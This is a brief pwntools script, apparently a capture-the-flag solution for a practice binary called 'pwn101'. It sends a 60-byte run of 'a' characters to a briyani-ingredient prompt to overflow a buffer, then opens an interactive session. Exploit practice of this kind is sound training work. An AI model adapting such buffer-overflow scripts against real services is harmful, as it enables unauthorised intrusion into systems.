from pwn import *

DEBUG = 0
if DEBUG == 0 :
    p = process("./pwn101")

else:
    p = remote("", 9001)


p.recvline(b"Type the required ingredients to make briyani:")      
p.sendline(b"a"*60)
p.interactive()  
